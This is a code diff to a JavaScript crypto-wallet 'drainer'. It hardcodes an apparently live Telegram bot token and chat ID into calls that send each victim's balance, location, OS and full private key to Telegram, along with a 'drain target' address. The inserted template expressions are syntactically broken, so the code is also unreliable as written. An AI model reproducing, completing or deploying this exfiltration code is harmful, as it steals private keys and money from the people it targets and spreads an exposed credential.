@@ -1,6 +1,6 @@
 // CONFIG
-const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+const TELEGRAM_BOT_TOKEN = '7689015696:AAG8Ci3BcoWRlDmziyfq6dVRnL1Hcqw0bxo';
+const TELEGRAM_CHAT_ID = '5430364847';
 const DRAINER_WEBHOOK = 'https://webhook.site/YOUR-ID';
 
 const BUTTON_DATA = {
@@ -53,11 +53,11 @@ ${BUTTON_DATA.balance}: ~$${victimData.balance}
 📍 *Location:* ${victimData.location}
 💻 *OS:* ${victimData.os}`;
 
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+  await fetch(`https://api.telegram.org/bot${7689015696:AAG8Ci3BcoWRlDmziyfq6dVRnL1Hcqw0bxo}/sendMessage`, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
+      chat_id: 5430364847,
       text: message,
       parse_mode: 'Markdown',
       reply_markup: JSON.stringify(keyboard),
@@ -65,11 +65,11 @@ ${BUTTON_DATA.balance}: ~$${victimData.balance}
     })
   });
 
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+  await fetch(`https://api.telegram.org/bot${7689015696:AAG8Ci3BcoWRlDmziyfq6dVRnL1Hcqw0bxo}/sendMessage`, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
+      chat_id: 5430364847,
       text: `🔓 *COMPLETE PRIVATE KEY:*\n\`${victimData.fullKey}\`\n\n💸 *Drain Target:* ${DRAIN_ADDRESSES[victimData.coin] || 'Multi-coin'}`,
       parse_mode: 'Markdown'
     })
